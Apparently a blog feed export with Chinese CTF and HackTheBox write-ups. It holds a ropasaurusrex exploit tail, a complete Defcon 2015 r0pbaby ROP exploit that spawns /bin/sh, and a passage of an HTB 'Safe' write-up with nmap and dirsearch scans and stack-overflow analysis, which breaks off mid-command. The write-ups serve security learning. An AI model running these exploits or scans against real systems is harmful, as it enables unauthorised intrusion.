class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">'libc.so.fuck'</span>)</span><br><span class="line">elf = ELF(<span class="string">'ropasaurusrex'</span>)</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">'./ropasaurusrex'</span>)</span><br><span class="line"></span><br><span class="line">plt_write = elf.symbols[<span class="string">'write'</span>]</span><br><span class="line">got_write = elf.got[<span class="string">'write'</span>]</span><br><span class="line">bof = <span class="number">0x080483F4</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">'A'</span> * <span class="number">140</span> + p32(plt_write) + p32(bof) + p32(<span class="number">1</span>) + p32(got_write) + p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n#########sending payload1....#######"</span></span><br><span class="line">io.send(payload1)</span><br><span class="line"></span><br><span class="line">write_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line">log.success(<span class="string">'write_addr = '</span> + hex(write_addr))</span><br><span class="line"></span><br><span class="line">libc_base = write_addr - libc.symbols[<span class="string">'write'</span>]</span><br><span class="line">log.success(<span class="string">'libc_base= '</span> + hex(libc_base))</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">log.success(<span class="string">'system_addr= '</span> + hex(system_addr))</span><br><span class="line">binsh_addr = libc_base + next(libc.search(<span class="string">'/bin/sh'</span>))</span><br><span class="line">log.success(<span class="string">'binsh_addr= '</span> + hex(binsh_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用system函数，参数是binsh</span></span><br><span class="line">payload2 = <span class="string">'A'</span> * <span class="number">140</span> + p32(system_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(binsh_addr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n########sending payload2....########"</span></span><br><span class="line">io.send(payload2)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;本文有关的程序可以到我的github中下载：&lt;a href=&quot;https://github.com/
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Defcon 2015 R0pbaby writeup - PWN</title>
    <link href="https://danta.fun/2019/12/15/Defcon-2015-R0pbaby-writeup/"/>
    <id>https://danta.fun/2019/12/15/Defcon-2015-R0pbaby-writeup/</id>
    <published>2019-12-15T07:30:10.000Z</published>
    <updated>2019-12-16T14:54:12.114Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>本文有关的binary可以到我的github中下载：<a href="https://github.com/cxliker/ctf_pwn/tree/master/r0pbaby" target="_blank" rel="noopener">https://github.com/cxliker/ctf_pwn/tree/master/r0pbaby</a><br>从题目就可以看出来，这应该是算一道简单的rop题目吧。</p><h1 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h1><p>题目没有给libc.so文件，只有一个elf文件，可以先用checksec.sh看看程序开了什么保护：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br><span class="line">FORTIFY:  Enabled</span><br></pre></td></tr></table></figure><p>可以看到r0pbaby是一个64位的程序，传参要用寄存器实现，往往就意味需要找gadgets来实现。<br>NX开启了意味着栈上不能执行shellcode，而PIE开启了说明每次程序执行的时候内部变量什么的地址都是变化的。</p><p>接下来我们还是像例行公事一下运行一下程序跑跑流程，以企图找到程序漏洞的地方。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ./r0pbaby</span></span><br><span class="line"></span><br><span class="line">Welcome to an easy Return Oriented Programming challenge...</span><br><span class="line">Menu:</span><br><span class="line">1) Get libc address</span><br><span class="line">2) Get address of a libc <span class="keyword">function</span></span><br><span class="line">3) Nom nom r0p buffer to stack</span><br><span class="line">4) Exit</span><br><span class="line">: 1</span><br><span class="line">libc.so.6: 0x00007FDF6F13E4F0</span><br><span class="line">1) Get libc address</span><br><span class="line">2) Get address of a libc <span class="keyword">function</span></span><br><span class="line">3) Nom nom r0p buffer to stack</span><br><span class="line">4) Exit</span><br><span class="line">: 2</span><br><span class="line">Enter symbol: system</span><br><span class="line">Symbol system: 0x00007FDF6E9D1510</span><br><span class="line">1) Get libc address</span><br><span class="line">2) Get address of a libc <span class="keyword">function</span></span><br><span class="line">3) Nom nom r0p buffer to stack</span><br><span class="line">4) Exit</span><br><span class="line">: 3</span><br><span class="line">Enter bytes to send (max 1024): <span class="built_in">test</span></span><br><span class="line">Invalid amount.</span><br><span class="line">1) Get libc address</span><br><span class="line">2) Get address of a libc <span class="keyword">function</span></span><br><span class="line">3) Nom nom r0p buffer to stack</span><br><span class="line">4) Exit</span><br><span class="line">: 4</span><br><span class="line">Exiting.</span><br></pre></td></tr></table></figure><p>从上图我们看出<br>功能1：用来获得libc的基地址。<br>功能2：可以获得任意libc function的地址<br>功能3：我们可以发送不超过1024个字符的数据到程序中</p><p>做到现在，事情已经有一点明朗了。<br>不过题目中有一个奇怪的地方是，从功能1获得的libc基地址并不是真正的libc的基地址，因为你可以看到上面的结果，基地址的地址怎么会比system函数的地址还要大？并且基地址的地址并没有页对齐，不是0x1000的倍数（页大小通常4k，即4096bytes）。一个大神的<a href="https://blog.skullsecurity.org/2015/defcon-quals-r0pbaby-simple-64-bit-rop" target="_blank" rel="noopener">writeup</a>中提到说很有可能是题目的bug。<br>不过即使没有libc的基地址，我们有功能2，可以泄漏任何函数的地址，已经足够我们算出libc的基地址了。然后通过泄漏出来的libc中的函数地址，构造rop链利用功能3发送出去getshell。</p><p>为了证明思路，我们用ida分析一下程序：</p><p><img src="/image/5.png" alt></p><p>程序中用到了<code>memcpy</code>函数，但是并没有检查并限制数据的大小，于是产生了缓冲区溢出漏洞。</p><p><code>memcpy</code>的API：</p><blockquote><p>void memcpy(voiddest, const void * src, size_t n);<br>由src指向地址为起始地址的连续n个字节的数据复制到以destin指向地址为起始地址的空间内。</p></blockquote><p>其中一个值得注意的地方是，通过阅读代码发现，功能3正确的用法应该是先输入数据的长度，再输入数据。如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ./r0pbaby </span></span><br><span class="line"></span><br><span class="line">Welcome to an easy Return Oriented Programming challenge...</span><br><span class="line">Menu:</span><br><span class="line">1) Get libc address</span><br><span class="line">2) Get address of a libc <span class="keyword">function</span></span><br><span class="line">3) Nom nom r0p buffer to stack</span><br><span class="line">4) Exit</span><br><span class="line">: 3</span><br><span class="line">Enter bytes to send (max 1024): 5</span><br><span class="line">abcde</span><br><span class="line">1) Get libc address</span><br><span class="line">2) Get address of a libc <span class="keyword">function</span></span><br><span class="line">3) Nom nom r0p buffer to stack</span><br><span class="line">4) Exit</span><br><span class="line">: Bad choice.</span><br></pre></td></tr></table></figure><p>根据上面的信息，解题的思路已经出来了，我们需要：</p><ol><li>找到<code>pop rdi; ret</code>的gadgets。</li><li>算出<code>/bin/sh</code>在libc中的地址。</li><li>找到<code>system</code>的地址，这个容易，可以直接通过功能2获得。</li></ol><p>因为程序中没有调用system函数，也没有<code>/bin/sh</code>的字符串，所以只能到libc.so中找。但由于题目没有给libc.so文件，就只能用自己的本机的测试。如果题目环境中的libc.so文件和自己本地的版本有差异，可以通过功能2 leak出两个函数的地址，算出offset，再看看在libc database中找到对应的版本。</p><p>找到本机的libc.so文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ldd r0pbaby </span></span><br><span class="line">linux-vdso.so.1 (0x00007ffc70789000)</span><br><span class="line">libdl.so.2 =&gt; /lib/x86_64-linux-gnu/libdl.so.2 (0x00007ff469cbd000)</span><br><span class="line">libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007ff469903000)</span><br><span class="line">/lib64/ld-linux-x86-64.so.2 (0x00007ff46a0c4000)</span><br></pre></td></tr></table></figure><p>可以看到文件在<code>/lib/x86_64-linux-gnu/libc.so.6</code></p><h1 id="0x02-找Gadgets"><a href="#0x02-找Gadgets" class="headerlink" title="0x02 找Gadgets"></a>0x02 找Gadgets</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ROPgadget --binary lib.so.6 --only 'pop|ret' | grep rdi</span></span><br><span class="line">0x0000000000021fad : pop rdi ; pop rbp ; ret</span><br><span class="line">0x000000000002144f : pop rdi ; ret</span><br><span class="line">0x000000000009c851 : pop rdi ; ret 0xd</span><br><span class="line">0x00000000000b505d : pop rdi ; ret 0xfff6</span><br></pre></td></tr></table></figure><p>找到一个很适用的<code>0x000000000002144f</code>，但由于程序开启了PIE，服务器甚至也可能开了ASLR，所以每次的地址都是变化的，但是虽然是变化，函数之间的偏移量是不变的，如果我们通过功能2获取到了一个函数的真实地址，就可以通过偏移量算出这个gadget的真实地址。以下的<code>/bin/sh</code>也同理。</p><h1 id="0x03-找-bin-sh的地址"><a href="#0x03-找-bin-sh的地址" class="headerlink" title="0x03 找/bin/sh的地址"></a>0x03 找<code>/bin/sh</code>的地址</h1><p><code>pwntools</code>有个很好用的模块<code>ELF</code>，里面有个很好用的函数可以找到字符串的地址，用法如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'lib.so.6'</span>)</span><br><span class="line"></span><br><span class="line">sh_addr = elf.search(<span class="string">'/bin/sh'</span>).next()</span><br></pre></td></tr></table></figure><h1 id="0x04-exp"><a href="#0x04-exp" class="headerlink" title="0x04 exp"></a>0x04 exp</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'lib.so.6'</span>)</span><br><span class="line"></span><br><span class="line">base_libc_addr = elf.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line"></span><br><span class="line">system_addr = elf.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">sh_addr = elf.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line"></span><br><span class="line">offset_system_addr = system_addr - base_libc_addr</span><br><span class="line">offset_sh_addr = sh_addr - base_libc_addr</span><br><span class="line">offset_pr_addr = <span class="number">0x2144f</span> - system_addr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./r0pbaby'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Menu:'</span>)</span><br><span class="line">p.recvuntil(<span class="string">':'</span>)</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">p.recvuntil(<span class="string">':'</span>)</span><br><span class="line">p.sendline(<span class="string">'system'</span>)</span><br><span class="line">p.recvuntil(<span class="string">':'</span>)</span><br><span class="line">system_addr_real = int(p.recvline(), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">libc_base = system_addr_real - offset_system_addr</span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc_base = "</span> + hex(libc_base)</span><br><span class="line">rdi_addr = system_addr_real + offset_pr_addr</span><br><span class="line"><span class="keyword">print</span> <span class="string">"rdi_addr = "</span> + hex(rdi_addr)</span><br><span class="line">binsh_addr = libc_base + offset_sh_addr</span><br><span class="line"><span class="keyword">print</span> <span class="string">"binsh_addr = "</span> + hex(binsh_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"system_addr = "</span> + hex(system_addr_real)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将binsh的内容弹到rdi中，然后调用system</span></span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">8</span> + p64(rdi_addr) + p64(binsh_addr) + p64(system_addr_real)</span><br><span class="line"></span><br><span class="line">p.recv(<span class="number">1024</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recv(<span class="number">1024</span>)</span><br><span class="line">p.send(<span class="string">"%d\n"</span>%(len(payload)+<span class="number">1</span>))</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;本文有关的binary可以到我的github中下载：&lt;a href=&quot;https://github.
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>HTB safe Writeup</title>
    <link href="https://danta.fun/2019/12/14/htb-safe-writeup/"/>
    <id>https://danta.fun/2019/12/14/htb-safe-writeup/</id>
    <published>2019-12-14T11:07:29.000Z</published>
    <updated>2019-12-17T15:50:17.308Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这是一篇writeup，靶机是来自hackthebox的<a href="https://www.hackthebox.eu/home/machines/profile/199" target="_blank" rel="noopener">safe</a></p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>一开始扫全端口，不知道是不是网络问题，怎么都扫不完，后来限制了一下速率：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">kali at ~/htb/safe ❯ nmap -p- --min-rate 10000 -sV -sC -sS 10.10.10.147</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-14 22:27 EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.147</span><br><span class="line">Host is up (7.6s latency).</span><br><span class="line">Not shown: 61065 filtered ports, 4468 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 6d:7c:81:3d:6a:3d:f9:5f:2e:1f:6a:97:e5:00:ba:de (RSA)</span><br><span class="line">|   256 99:7e:1e:22:76:72:da:3c:c9:61:7d:74:d7:80:33:d2 (ECDSA)</span><br><span class="line">|_  256 6a:6b:c3:8e:4b:28:f7:60:85:b1:62:ff:54:bc:d8:d6 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.25 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.4.25 (Debian)</span><br><span class="line">|_http-title: Apache2 Debian Default Page: It works</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure><p>只有22端口和80端口，看来只能从Web入手了，大便系统上搭的apache</p><h3 id="为什么没扫出来1337端口"><a href="#为什么没扫出来1337端口" class="headerlink" title="为什么没扫出来1337端口"></a>为什么没扫出来1337端口</h3><p>在后续的发现中是还有一个1337端口是开放的，后面看别人的Writeup也有部分Writeup是可以扫出来1337端口的，为啥我这里没有扫出来呢？原因在于应使用<code>-PN</code>参数：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">kali at ~/htb/safe ❯ nmap -Pn -p1337 10.10.10.147</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-14 23:01 EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.147</span><br><span class="line">Host is up (0.45s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">1337/tcp open  waste</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 0.67 seconds</span><br><span class="line">kali at ~/htb/safe ❯ nmap -p1337 10.10.10.147</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-14 23:01 EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.147</span><br><span class="line">Host is up (0.00029s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE    SERVICE</span><br><span class="line">1337/tcp filtered waste</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 0.69 seconds</span><br></pre></td></tr></table></figure><p>默认下nmap是会先探测主机是否存活，使用<code>-Pn</code>会跳过主机探测的步骤（也就是不Ping）。但是这里有点疑惑的这个IP本身就是可以Ping的，所以理论上跳不跳过主机探测不都是一样的吗？为什么用不用<code>-Pn</code>参数的效果不一样呢？</p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><p>打开只有一个大便Apache的默认页面：</p><p><img src="/image/6.jpg" alt></p><p>看到这个页面就觉得应该是要扫一下目录：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">⇒  python dirsearch.py -u http://10.10.10.147 -e *</span><br><span class="line"></span><br><span class="line"> _|. _ _  _  _  _ _|_    v0.3.8</span><br><span class="line">(_||| _) (/_(_|| (_| )</span><br><span class="line"></span><br><span class="line">Extensions: CHANGELOG.md | HTTP method: get | Threads: 10 | Wordlist size: 6103</span><br><span class="line"></span><br><span class="line">Error Log: /Users/danta/Code/dirsearch/logs/errors-19-12-14_19-09-19.log</span><br><span class="line"></span><br><span class="line">Target: http://10.10.10.147</span><br><span class="line"></span><br><span class="line">[19:09:20] Starting:</span><br><span class="line">[19:09:33] 403 -  291B  - /.hta</span><br><span class="line">[19:09:33] 403 -  300B  - /.htaccess.BAK</span><br><span class="line">[19:09:33] 403 -  301B  - /.htaccess.bak1</span><br><span class="line">[19:09:33] 403 -  302B  - /.htaccess-marco</span><br><span class="line">[19:09:33] 403 -  300B  - /.htaccess-dev</span><br><span class="line">[19:09:33] 403 -  302B  - /.htaccess-local</span><br><span class="line">[19:09:33] 403 -  298B  - /.ht_wsr.txt</span><br><span class="line">[19:09:33] 403 -  300B  - /.htaccess.old</span><br><span class="line">[19:09:33] 403 -  301B  - /.htaccess.orig</span><br><span class="line">[19:09:33] 403 -  301B  - /.htaccess.save</span><br><span class="line">[19:09:33] 403 -  303B  - /.htaccess.sample</span><br><span class="line">[19:09:33] 403 -  300B  - /.htaccess.txt</span><br><span class="line">[19:09:33] 403 -  299B  - /.htaccess_sc</span><br><span class="line">[19:09:33] 403 -  299B  - /.htaccessBAK</span><br><span class="line">[19:09:33] 403 -  302B  - /.htaccess_extra</span><br><span class="line">[19:09:33] 403 -  301B  - /.htaccess_orig</span><br><span class="line">[19:09:34] 403 -  300B  - /.htaccessOLD2</span><br><span class="line">[19:09:34] 403 -  295B  - /.htgroup</span><br><span class="line">[19:09:34] 403 -  297B  - /.htaccess~</span><br><span class="line">[19:09:34] 403 -  299B  - /.htaccessOLD</span><br><span class="line">[19:09:34] 403 -  300B  - /.htpasswd-old</span><br><span class="line">[19:09:34] 403 -  301B  - /.htpasswd_test</span><br><span class="line">[19:09:35] 403 -  297B  - /.htpasswds</span><br><span class="line">[19:09:35] 403 -  295B  - /.htusers</span><br><span class="line">[19:12:31] 200 -   11KB - /index.html</span><br><span class="line">[19:12:56] 301 -  313B  - /manual  -&gt;  http://10.10.10.147/manual/</span><br><span class="line">[19:12:56] 200 -  626B  - /manual/index.html</span><br><span class="line">[19:13:53] 403 -  300B  - /server-status</span><br><span class="line">[19:13:53] 403 -  301B  - /server-status/</span><br><span class="line"></span><br><span class="line">Task Completed</span><br></pre></td></tr></table></figure><p>打开<code>/manual</code>看看，发现是apache的文档页面，又是默认页面。后来又换了一些字典，发现还是相同的结果。想来想去也没有别的入口的，后来看看别人的writeup才发现原来还可以这样。。。</p><p>查看首页的源码：</p><p><img src="/image/8.jpg" alt></p><p>里面说还有个1337端口，而且这个程序还可以通过访问路径<code>myapp</code>下载。我是真没想到还可以修改默认页面，看来真是每个细节都不能放过。。</p><p>下载myapp后查看是个可执行文件，执行一下看看，然后再看看1337端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">kali at ~/htb/safe ❯ file myapp</span><br><span class="line">myapp: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="keyword">for</span> GNU/Linux 3.2.0, BuildID[sha1]=fcbd5450d23673e92c8b716200762ca7d282c73a, not stripped</span><br><span class="line">kali at ~/htb/safe ❯ chmod u+x myapp</span><br><span class="line">kali at ~/htb/safe ❯ ./myapp</span><br><span class="line"> 00:23:04 up 1 day, 23:52,  3 users,  load average: 0.00, 0.00, 0.00</span><br><span class="line"></span><br><span class="line">What <span class="keyword">do</span> you want me to <span class="built_in">echo</span> back? ls</span><br><span class="line">ls</span><br><span class="line">kali at ~/htb/safe ❯ nc 10.10.10.147 1337</span><br><span class="line"> 00:26:35 up 18:21,  0 users,  load average: 0.00, 0.00, 0.00</span><br><span class="line">ls</span><br><span class="line"></span><br><span class="line">What <span class="keyword">do</span> you want me to <span class="built_in">echo</span> back? ls</span><br></pre></td></tr></table></figure><p>到这一步后我有点意外…这不就是一道pwn题吗….</p><h1 id="通过栈溢出GetShell"><a href="#通过栈溢出GetShell" class="headerlink" title="通过栈溢出GetShell"></a>通过栈溢出GetShell</h1><p>到现在我们知道1337端口的程序就是<code>myapp</code>，就目前所知的是这个程序会输出我们输入的东西。看起来就是一个栈溢出的题目。</p><p>使用checksec查看表示开启了NX，但是没有其他的保护了。栈溢出的利用方式大概有4种（<a href="https://paper.seebug.org/271/" target="_blank" rel="noopener">手把手教你栈溢出从入门到放弃（上）</a>，<a href="https://paper.seebug.org/272/" target="_blank" rel="noopener">手把手教你栈溢出从入门到放弃（下）</a>）。NX开启了意味着栈上不能执行shellcode，这儿又不知道所用的动态库的版本，没办法用return2libc方法。所以只能用rop的方式。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@kali:htb/safe <span class="comment"># gdb -q myapp</span></span><br><span class="line">Reading symbols from myapp...</span><br><span class="line">(No debugging symbols found <span class="keyword">in</span> myapp)</span><br><span class="line">gdb-peda$ checksec</span><br><span class="line">CANARY    : disabled</span><br><span class="line">FORTIFY   : disabled</span><br><span class="line">NX        : ENABLED</span><br><span class="line">PIE       : disabled</span><br><span class="line">RELRO     : Partial</span><br></pre></td></tr></table></figure><p>要利用ROP来getshell，我们需要确定两件事：一个是溢出数据的长度，另一个是<code>gadget</code>（某段指令）的地址。</p><h2 id="确定溢出长度"><a href="#确定溢出长度" class="headerlink" title="确定溢出长度"></a>确定溢出长度</h2><p>给<code>gdb</code>装上 <a href="https://github.com/longld/peda" target="_blank" rel="noopener">Peda</a> 插件，可以很简单即可确定溢出长度。这里需要注意的是，gdb在调试多进程的时候，默认会只调试主进程，而peda是会继续跟踪子进程（<a href="https://www.ibm.com/developerworks/cn/linux/l-cn-gdbmp/index.html" target="_blank" rel="noopener">相关</a>）。在这个程序中，因为多进程的原因导致程序直接退出了，所以先设置了一下<code>set follow-fork-mode parent</code>来保证peda只调试主进程。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">root@kali:htb/safe <span class="comment"># gdb -q 